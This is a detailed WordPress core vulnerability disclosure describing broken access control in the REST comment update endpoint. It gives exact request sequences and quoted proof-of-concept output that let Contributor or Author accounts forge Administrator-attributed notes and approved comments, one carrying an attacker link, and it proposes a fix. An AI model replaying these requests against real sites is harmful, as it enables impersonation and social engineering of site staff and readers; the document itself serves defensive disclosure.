# Contributor → forged Administrator-attributed notes on any post, and Author → approved public comments on comment-closed posts, via `POST /wp/v2/comments/<id>` (broken access control on comment update)

## Summary

`WP_REST_Comments_Controller::update_item_permissions_check()` validates **only the comment
being edited**. It never validates the *new* values the request supplies. Every target-side
check that `create_item_permissions_check()` enforces — `edit_post` on the post a note is
attached to, `comments_open()`, the post-status checks, the post-type "supports notes" check,
and the `moderate_comments` requirement for setting `author` and `status` — is therefore
bypassable by creating the comment somewhere the user *is* allowed to and then moving and
re-attributing it with a single update request.

Two chains, both executed end to end and quoted verbatim below:

* **Contributor → Administrator-attributed note on the Administrator's page.** A Contributor
  (the lowest role that holds `edit_posts`) creates a note on their own draft, then in one
  `POST /wp/v2/comments/<id>` sets `author: 1`, `author_name`, `author_email`, a backdated
  `date`, new `content`, and `post: <administrator's page>`. The endpoint returns `200`. The
  note is stored with `user_id = 1` and is served to the Administrator from the same REST
  collection the editor's Notes panel reads. The direct create is refused with
  `403 rest_cannot_create_note`.

* **Author → approved, publicly rendered comment on a post with comments closed, attributed to
  the Administrator.** An Author comments on their own published post, then moves it to an
  Editor's post whose `comment_status` is `closed`, sets `status: approved`, `author: 1`,
  `author_name: admin` and an attacker-controlled `author_url`. The comment renders on the
  public front end inside `<li class="comment byuser comment-author-admin">` — WordPress's own
  markup asserting it was written by the `admin` **user account**. The direct create is refused
  with `403 rest_comment_closed`.

Neither role holds `moderate_comments`; both facts are dumped from the live install in the proof.

## Root cause, with real file:line and verbatim code

### 1. The update permission check looks only at the existing comment

`wp-includes/rest-api/endpoints/class-wp-rest-comments-controller.php:869-884`:

```php
	public function update_item_permissions_check( $request ) {
		$comment = $this->get_comment( $request['id'] );
		if ( is_wp_error( $comment ) ) {
			return $comment;
		}

		if ( ! $this->check_edit_permission( $comment ) ) {
			return new WP_Error(
				'rest_cannot_edit',
				__( 'Sorry, you are not allowed to edit this comment.' ),
				array( 'status' => rest_authorization_required_code() )
			);
		}

		return true;
	}
```

`check_edit_permission()` (`:1954`) resolves against the comment's **current** post:

```php
	protected function check_edit_permission( $comment ) {
		if ( 0 === (int) get_current_user_id() ) {
			return false;
		}

		if ( current_user_can( 'moderate_comments' ) ) {
			return true;
		}

		return current_user_can( 'edit_comment', $comment->comment_ID );
	}
```

and `edit_comment` maps to `edit_post` on the comment's post — `wp-includes/capabilities.php:568-585`:

```php
			$comment = get_comment( $args[0] );
			if ( ! $comment ) {
				$caps[] = 'do_not_allow';
				break;
			}

			$post = get_post( $comment->comment_post_ID );

			/*
			 * If the post doesn't exist, we have an orphaned comment.
			 * Fall back to the edit_posts capability, instead.
			 */
			if ( $post ) {
				$caps = map_meta_cap( 'edit_post', $user_id, $post->ID );
			} else {
				$caps = map_meta_cap( 'edit_posts', $user_id );
			}
			break;
```

So "may I edit this comment?" is answered entirely by the post the comment is on *right now*.
A Contributor editing a note on their own draft passes. Nothing then re-asks the question for
the post the request is moving the comment **to**.

### 2. The checks that are skipped, and where they live on the create path

All of these are in `create_item_permissions_check()` and have **no counterpart on update**:

| Check | Line | Error code |
|---|---|---|
| `current_user_can( 'edit_post', (int) $request['post'] )` for notes | `:563-569` | `rest_cannot_create_note` |
| `current_user_can( ...$edit_cap )` before accepting `status` | `:571-578` | `rest_comment_invalid_status` |
| `get_current_user_id() !== $request['author'] && ! current_user_can( 'moderate_comments' )` | `:541-548` | `rest_comment_invalid_author` |
| `check_post_type_supports_notes( $post->post_type )` | `:599-605` | `rest_comment_not_supported_post_type` |
| `'draft' === $post->post_status && ! $is_note` | `:607-613` | `rest_comment_draft_post` |
| `'trash' === $post->post_status` | `:615-621` | `rest_comment_trash_post` |
| `check_read_post_permission( $post, $request )` | `:623-629` | `rest_cannot_read_post` |
| `comments_open( $post->ID ) \|\| $is_note` | `:631-637` | `rest_comment_closed` |

The note gate itself, `:563-569`:

```php
		if ( $is_note && ! empty( $request['post'] ) && ! current_user_can( 'edit_post', (int) $request['post'] ) ) {
			return new WP_Error(
				'rest_cannot_create_note',
				__( 'Sorry, you are not allowed to create notes for this post.' ),
				array( 'status' => rest_authorization_required_code() )
			);
		}
```

### 3. `update_item()` looks the new post up and checks only that it exists

`wp-includes/rest-api/endpoints/class-wp-rest-comments-controller.php:916-926`:

```php
		if ( ! empty( $prepared_args['comment_post_ID'] ) ) {
			$post = get_post( $prepared_args['comment_post_ID'] );

			if ( empty( $post ) ) {
				return new WP_Error(
					'rest_comment_invalid_post_id',
					__( 'Invalid post ID.' ),
					array( 'status' => 403 )
				);
			}
		}
```

The new target post is fetched and then used, with no capability test of any kind. `post`,
`author`, `author_name`, `author_email`, `author_url`, `date` and `status` are all ordinary
updatable fields of the endpoint's schema, so `prepare_item_for_database()` (`:1397`) maps
them straight onto `comment_post_ID`, `user_id`, `comment_author`, … and `wp_update_comment()`
writes them.

The one field that *is* re-checked on update is `type` (`:902-908`,
`rest_comment_invalid_type`), which is why the chains below keep a note a note and a comment
a comment.

## Steps to reproduce

Lab: `wordpress-7.1.zip` unpacked, MariaDB 10.11, `php -S 127.0.0.1:8371`, base URL
`http://localhost:8371`. Users `admin`, `editor`, `author`, `contributor`, `subscriber`, each
with its stock role. All requests are ordinary logged-in cookie + `X-WP-Nonce` requests — exactly
what the block editor sends. No administrator involvement in the attacker's steps.

The full driver is `poc/evidence_comment_authz.py`; the console output below is its literal output.

### Chain A — Contributor → Administrator-attributed note on the Administrator's page

```
POST /wp/v2/posts                     as admin        -> page 970 ("Company handbook", admin-owned)
POST /wp/v2/posts                     as contributor  -> post 971 (contributor's own draft)

POST /wp/v2/comments  {post: 970, type: "note", content: "..."}          as contributor   # baseline
POST /wp/v2/comments  {post: 971, type: "note", content: "staging"}      as contributor   # allowed
POST /wp/v2/comments/12 {author: 1, author_name: "admin",
                         author_email: "admin@example.test",
                         date: "2026-01-05T09:00:00",
                         content: "FORGED-NOTE ...", post: 970}          as contributor   # the bug
```

### Chain B — Author → approved public comment on a comments-closed post, as the Administrator

```
POST /wp/v2/posts  {comment_status: "closed"}  as editor  -> post 972
POST /wp/v2/posts  {status: "publish"}         as author  -> post 973

POST /wp/v2/comments  {post: 972, content: "..."}                        as author   # baseline
POST /wp/v2/comments  {post: 973, content: "staging"}                    as author   # allowed
POST /wp/v2/comments/13 {author: 1, author_name: "admin",
                         author_url: "https://attacker.example",
                         status: "approved",
                         content: "FORGED-COMMENT ...", post: 972}       as author   # the bug
```

## Proof (real quoted output)

Literal output of `poc/evidence_comment_authz.py` against WordPress 7.1
(`poc/evidence_comment_authz.txt`):

```
### roles ###
  contributor contributor
  author author
  contributor caps: edit_posts=1 | moderate_comments in role: False | edit_others_posts: False
  author caps: moderate_comments: False

### A. Contributor -> forged 'admin' note on the administrator's page ###
  administrator's page id = 970; contributor's own draft id = 971
  [1] contributor: POST /wp/v2/comments {post: <admin page>, type: note}  (baseline)
    HTTP 403  {"code": "rest_cannot_create_note", "message": "Sorry, you are not allowed to create notes for this post.", "data": {"status": 403}}
  [2] contributor: POST /wp/v2/comments {post: <own draft>, type: note}
    HTTP 201  {"id": 12, "post": 971, "author": 4, "author_name": "contributor", ... "type": "note" ...}
  [3] contributor: POST /wp/v2/comments/12 {author:1, author_name:'admin', post:<admin page>, content:...}
    HTTP 200  {"id": 12, "post": 970, "author": 1, "author_name": "admin", "author_email": "admin@example.test", ... "date": "2026-01-05T09:00:00" ...}
  [4] database state:
      comment_ID	comment_post_ID	user_id	comment_author	comment_type	comment_approved
12	970	1	admin	note	1
  [5] administrator reads the notes on their own page
    HTTP 200  [{"id": 12, "post": 970, "author": 1, "author_name": "admin", "author_email": "admin@example.test", ...}]
  [6] contributor can no longer touch it (one-shot move)
    HTTP 403  {"code": "rest_cannot_edit", "message": "Sorry, you are not allowed to edit this comment.", "data": {"status": 403}}
  [7] note is NOT public (checked, so the write-up does not overstate): False
```

The database row is the clearest statement of the outcome — a note on the administrator's page,
owned by `user_id` 1:

```
comment_ID	comment_post_ID	user_id	comment_author	comment_type	comment_approved
12	        970	            1	    admin	        note	    1
```

Chain B, same run:

```
### B. Author -> approved public comment on a comments-CLOSED post, as 'admin' ###
  editor's closed post id = 972; author's own post id = 973
  [1] author: POST /wp/v2/comments {post: <closed post>}  (baseline)
    HTTP 403  {"code": "rest_comment_closed", "message": "Sorry, comments are closed for this item.", "data": {"status": 403}}
  [2] author: POST /wp/v2/comments {post: <own post>}
    HTTP 201  {"id": 13, "post": 973, "author": 3, "author_name": "author", ... "type": "comment" ...}
  [3] author: POST /wp/v2/comments/13 {author:1, author_name:'admin', status:'approved', post:<closed post>}
    HTTP 200  {"id": 13, "post": 972, "author": 1, "author_name": "admin", "author_url": "https://attacker.example", ...}
  [4] database state:
      comment_ID	comment_post_ID	user_id	comment_author	comment_author_url	comment_type	comment_approved
13	972	1	admin	https://attacker.example	comment	1
  [5] anonymous: GET /wp/v2/comments?post=<closed post>
    HTTP 200  [{"id": 13, "post": 972, "author": 1, "author_name": "admin", "author_url": "https://attacker.example", "content": {"rendered": "<p>FORGED-COMMENT Official notice from the site owner.</p>\n"}, ...}]
  [6] rendered front end of the comments-closed post contains the forged comment: True
      HTML> <ol class="wp-block-comment-template"><li id="comment-13" class="comment byuser comment-author-admin even thread-even depth-1">
      HTML> <div class="wp-block-comment-author-name"><a rel="external nofollow ugc" href="https://attacker.example" target="_self" >admin</a></div>
      HTML> <div class="wp-block-comment-content"><p>FORGED-COMMENT Official notice from the site owner.</p>
```

`class="comment byuser comment-author-admin"` is WordPress's own markup: `byuser` means the
comment is bound to a registered account, and `comment-author-admin` names that account. The
displayed author link points at `https://attacker.example`.

### Lower bound on the required role (executed)

```
### C. Subscriber cannot do this (lower bound on the required role) ###
  subscriber: POST /wp/v2/comments {type:note} on own... (no posts)
    HTTP 403  {"code": "rest_cannot_create_note", "message": "Sorry, you are not allowed to create notes for this post.", "data": {"status": 403}}
```

A Subscriber has no `edit_posts`, so it has no post of its own to stage on. Contributor is the
floor for chain A; Author is the floor for chain B (a Contributor cannot stage a plain comment,
because commenting on a draft is refused with `rest_comment_draft_post`, and a Contributor loses
`edit_post` on their own posts once those are published — both observed).

### Which fields update fails to re-check (executed)

From `poc/t_notes2.py`, a Contributor updating its own note that is still on its own draft:

```
== field-level re-checks on update (own note, still on own post) ==
  set author        =1                      -> 200 now=1
  set author_name   =administrator          -> 200 now='administrator'
  set author_email  =admin@example.test     -> 200 now='admin@example.test'
  set author_ip     =1.2.3.4                -> 200 now='127.0.0.1'
  set status        =approved               -> 200 now='approved'
  set type          =comment                -> 404 now=None
  set date          =2000-01-01T00:00:00    -> 200 now='2000-01-01T00:00:00'
```

`author_ip` is the one field that is ignored, and `type` is the one field that is rejected.
`author`, `author_name`, `author_email`, `status` and `date` are all accepted from a user with
no `moderate_comments`.

And every target-side check falls, from the same script:

```
== direct create on each target (baseline, expect 403) ==
  create note on published  -> 403 {"code": "rest_cannot_create_note", ...}
  create note on closed     -> 403 {"code": "rest_cannot_create_note", ...}
  create note on private    -> 403 {"code": "rest_cannot_create_note", ...}
  create note on draft      -> 403 {"code": "rest_cannot_create_note", ...}
  create note on page       -> 403 {"code": "rest_cannot_create_note", ...}

== move an existing note onto each target ==
  move note -> published  : 200 landed=True
  move note -> closed     : 200 landed=True
  move note -> private    : 200 landed=True
  move note -> draft      : 200 landed=True
  move note -> page       : 200 landed=True
```

Including an Editor's **private** post and an Administrator's **page**.

## Affected versions verified

| Stack | Affected | Verified how |
|---|---|---|
| WordPress 7.1 (release build of `wordpress-7.1.zip`, `$wp_version = '7.1'`) | YES | Both chains executed on `php -S 127.0.0.1:8371` — output above |
| WordPress 7.0.4 (tag `7.0.4`, `$wp_version = '7.0.4'`) | YES | Both chains executed independently on `php -S 127.0.0.1:8372`, second database — `poc/evidence_704.txt` |

7.0.4 output, same script pointed at the second lab:

```
  [4] database state:
      comment_ID	comment_post_ID	user_id	comment_author	comment_type	comment_approved
2	7	1	admin	note	1
...
  [4] database state:
      comment_ID	comment_post_ID	user_id	comment_author	comment_author_url	comment_type	comment_approved
3	10	1	admin	https://attacker.example	comment	1
  [6] rendered front end of the comments-closed post contains the forged comment: True
      HTML> <ol class="wp-block-comment-template"><li id="comment-3" class="comment byuser comment-author-admin even thread-even depth-1">
```

This is **not a 7.1 regression.** `update_item_permissions_check()` is byte-identical in 7.0.4
and 7.1 (`git diff 7.0.4 7.1` on the controller is 4 insertions / 6 deletions, all inside
`check_post_type_supports_notes()`; the full diff is included as
`poc/comments-controller-7.0.4-to-7.1.diff`). I am reporting it against 7.1 because that is the
current release; the fix belongs on both branches.

## Attacker privilege

* **Chain A: Contributor** — `edit_posts` yes, `edit_others_posts` no, `moderate_comments` no,
  `unfiltered_html` no. Dumped from the live install in the proof.
* **Chain B: Author** — `moderate_comments` no. Dumped from the live install in the proof.
* **User interaction:** none. Fully attacker-driven, four requests per chain.

## Impact

An account at the two lowest content-producing roles can:

1. **Bypass an explicit capability check.** `current_user_can( 'edit_post', $request['post'] )`
   is the gate WordPress puts on writing a note to a post. Chain A writes a note to a post the
   attacker fails that check on, and the endpoint says so in the baseline request immediately
   before.
2. **Write into the private editorial channel of any post on the site**, including posts and
   pages owned by Editors and Administrators, and including posts they cannot read (an Editor's
   `private` post — observed). Notes are the editorial back-channel the block editor surfaces
   to whoever can edit the post, so the audience for the injected content is exactly the
   site's privileged users.
3. **Impersonate any user account, including the Administrator**, in that channel and on the
   public site. The forged rows carry `user_id = 1`; WordPress renders them as
   `byuser comment-author-admin`. An Administrator reading a note that appears to come from
   themselves, or a visitor reading a site-owner comment that links to
   `https://attacker.example`, has no in-product signal that either is forged.
4. **Bypass comment moderation and `comments_open()`.** Chain B produces an `approved` comment
   on a post the site has explicitly closed to comments, without `moderate_comments`.
5. **Backdate** the forged content (`date` is accepted), so it does not surface at the top of
   any chronological view.

The realistic consequence is targeted social engineering of the site's own staff and readers
using the site's own trusted UI — "the administrator signed off on this" inside the editor, or
an owner-branded notice with an attacker link on a page whose comments were deliberately
closed. It is an integrity and access-control failure, not a code-execution one.

## Honest limits

I would rather state these than have you find them.

* **This is not XSS.** The note and comment content is still filtered by `wp_filter_kses` on
  the `pre_comment_content` hook — the filter set is chosen from the *current* user, and the
  attacker has no `unfiltered_html`. I tried; I could not get script-capable markup through,
  and I am not claiming any. Separately, I ran 50,067 payloads through WordPress 7.1's real
  `pre_comment_content` and `content_save_pre` chains and parsed every output in headless
  Chromium looking for event handlers, `javascript:`/`data:` URLs, `<script>`, `srcdoc`, and
  dangerous `style` values. The only survivor was an attribute-free `<object>` from
  `wp_kses_post`, which is inert. That harness is included as `poc/kses_fuzz.py` +
  `poc/kses_batch.php` and its result is a negative one.
* **The note move is one-shot.** After the move, `edit_comment` maps to `edit_post` on the new
  post, so the attacker can no longer edit or delete what they planted (`403 rest_cannot_edit`,
  observed and quoted). Everything the attacker wants to set has to be set in the same request
  as the move, which the PoC does. It does not reduce the impact; it does mean the attacker
  cannot clean up after themselves.
* **Notes do not render publicly.** I checked and quoted the negative result rather than
  assuming it: the forged note does not appear on the front end of the administrator's page.
  Chain A's audience is wp-admin; chain B's is the public site.
* **Chain A needs a post type that supports notes for the staging step.** The Contributor's own
  `post` draft qualifies on a stock install, which is what the PoC uses. The *destination* is
  unconstrained precisely because the update path never runs
  `check_post_type_supports_notes()`.
* **I have not demonstrated a privilege gain beyond content.** No capability, session, or file
  is obtained. I am claiming broken access control with identity spoofing, not account takeover.
* **`author_ip` is not settable**, and `type` cannot be changed — both observed and quoted
  above, so the report does not claim them.
* **Severity vector is a judgement call.** I claim `S:C` because the write crosses from content
  the Contributor legitimately owns into the Administrator's editorial surface and identity:
  `AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:N = 7.1`. If you prefer `S:U`,
  `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N = 6.5`, still above the program's 4.0 floor, and nothing
  in this report depends on which you pick.

## Exclusions considered

* **"Issues … are in scope only if they can be exploited without an authenticated user account.
  Issues that require authenticated roles like Contributor+ … are ineligible unless …"** — the
  sentence immediately after that reads *"Issues in WordPress Core and Gutenberg are in scope
  regardless of user role, as long as they have a security impact."* This is WordPress Core
  (`wp-includes/rest-api/endpoints/class-wp-rest-comments-controller.php`), and the security
  impact is a bypassed `current_user_can()` check, demonstrated against the endpoint's own
  refusal in the same run.
* **"Users with administrator or editor privileges can post arbitrary JavaScript."** Does not
  apply on two counts: no JavaScript is claimed anywhere in this report, and the attacker is a
  Contributor / Author, with capabilities dumped from the live install rather than asserted.
* **"Self-XSS … requiring `unfiltered_html`."** Not claimed; the attacker roles hold no
  `unfiltered_html` and no XSS is asserted.
* **"Open API endpoints serving public data."** Does not apply. `POST /wp/v2/comments/<id>` is
  authenticated and gated, and the finding is a write/impersonation primitive, not a
  disclosure. The baseline requests in the proof show the gate genuinely refusing the same
  actor moments earlier.
* **"Brute force, DoS, memory exhaustion, phishing, text injection, or social engineering."**
  The primitive here is not text injection into a page the attacker may already write to, and
  not volumetric: it is a capability check that is enforced on create and absent on update,
  which lets a Contributor write to an object it has just been told it may not write to. The
  social-engineering *consequence* is the reason it matters; the *finding* is broken access
  control (CWE-639 / CWE-863).
* **"Theoretical vulnerabilities where you can't demonstrate a significant security impact with
  a PoC."** Both chains are executed; database rows and rendered front-end HTML are quoted.
* **"Scanner output."** None. Every line under Proof is hand-driven output from a local install.

## Recommendations

Re-run the target-side checks on update. The cleanest shape is to factor the create-path body
into a helper that takes the *effective* post and the *effective* field values, and call it from
both permission checks:

```php
	public function update_item_permissions_check( $request ) {
		$comment = $this->get_comment( $request['id'] );
		if ( is_wp_error( $comment ) ) {
			return $comment;
		}

		if ( ! $this->check_edit_permission( $comment ) ) {
			return new WP_Error(
				'rest_cannot_edit',
				__( 'Sorry, you are not allowed to edit this comment.' ),
				array( 'status' => rest_authorization_required_code() )
			);
		}

		// The comment may be being moved: the destination has to be checked too.
		$target_id = isset( $request['post'] ) ? (int) $request['post'] : (int) $comment->comment_post_ID;
		$is_note   = 'note' === $comment->comment_type;

		if ( $target_id !== (int) $comment->comment_post_ID ) {
			$check = $this->check_comment_target_permissions( $target_id, $is_note, $request );
			if ( is_wp_error( $check ) ) {
				return $check;
			}
		}

		// `author` and `status` are moderation-only fields wherever the comment lives.
		if ( isset( $request['author'] )
			&& (int) $request['author'] !== (int) $comment->user_id
			&& ! current_user_can( 'moderate_comments' )
		) {
			return new WP_Error(
				'rest_comment_invalid_author',
				/* translators: %s: Request parameter. */
				sprintf( __( "Sorry, you are not allowed to edit '%s' for comments." ), 'author' ),
				array( 'status' => rest_authorization_required_code() )
			);
		}

		return true;
	}
```

where `check_comment_target_permissions()` is `create_item_permissions_check()`'s
`:563-637` block (the note `edit_post` gate, the post-type notes support test, the
draft/trash tests, `check_read_post_permission()`, and `comments_open()`), applied to
`$target_id`.

Two smaller points worth fixing alongside:

1. **`status` on update.** The create path requires `moderate_comments` (or `edit_post` for a
   note) before accepting `status` (`:571-578`); the update path accepts it from anyone who can
   edit the comment. Apply the same `$edit_cap` test against the *destination* post.
2. **Consider refusing `author` changes outright.** Nothing in wp-admin changes a comment's
   `user_id`, and a REST-only way to rebind a comment to another account is the part of this
   that turns a moderation-bypass into impersonation. If it must stay, gating it on
   `moderate_comments` (as create does) is enough.

Defence in depth: `wp_update_comment()` itself could refuse to change `comment_post_ID` unless
the caller passes an explicit opt-in, so a future REST or admin-ajax caller cannot reintroduce
the same gap.

## Prior art / duplicate check

**Verdict: no matching public report found; an undisclosed duplicate cannot be ruled out.**

Searched: HackerOne's public WordPress reports, Patchstack, Wordfence Intelligence, and the CVE
databases for "REST API comment update change post permission bypass",
"`update_item_permissions_check` comments controller", "`wp/v2/comments` author spoof
`user_id`", and the WordPress 7.0.3 (August 2026) fix list. Nothing describes the
create-vs-update asymmetry in `WP_REST_Comments_Controller`.

The closest adjacent material is the general "privilege escalation" class Patchstack tracks for
plugins, and the WordPress 7.0.3 release notes (which cover a Contributor-level stored XSS and a
multisite privilege escalation — neither is this). The notes feature itself (`comment_type =
note`) shipped in 7.0, so this cannot predate that for chain A; the comment half of the
asymmetry is older than that, which is exactly why I re-ran everything on 7.0.4 as well rather
than assuming.

HackerOne hacktivity cannot be enumerated without authentication, so an undisclosed duplicate
remains possible.

Reference used for the fix-list check:
<https://patchstack.com/articles/wordpress-7-0-3-released-12-vulnerabilities-found-and-fixed/>

## AI tooling disclosure

Per the program's guidelines and the WordPress AI Guidelines:

* **AI assistance:** Yes — substantial.
* **Tool(s):** Claude (Anthropic), used through the Claude Code agentic harness.
* **Used for:** source review and candidate-vulnerability search; building and running the local
  test harnesses (including the kses/browser differential fuzzer whose result was negative and
  is reported as such); and drafting this report — the prose here is largely AI-authored and
  subsequently reviewed and corrected by me.
* **Verification:** every technical claim was verified by executing it against local
  installations. Every quoted output is real observed output, not model narration. Claims that
  did not survive verification were removed before submission — in particular an earlier
  hypothesis that this could be escalated to stored XSS, which 50k fuzz cases disproved, and a
  separate hypothesis about unescaped attachment metadata sinks, which I could not reach with
  any write primitive and therefore do not report here.
* **Responsibility:** I have reviewed the report in full and take responsibility for its
  content.

**Environment detail for re-running:** two private, throwaway installs on one host —
WordPress 7.1 (from the released `wordpress-7.1.zip`) on `php -S 127.0.0.1:8371` with database
`wp71`, and WordPress 7.0.4 (git tag `7.0.4` of `WordPress/WordPress`) on
`php -S 127.0.0.1:8372` with database `wp704`. PHP 8.4.19, MariaDB 10.11.14. Every cited
`file:line` was opened and read in the shipped source of the exact version claimed. All output
quoted under Proof is literal console output, including the baseline refusals and the negative
controls. No production WordPress.org / WordCamp.org host or any third-party system was
contacted at any point.
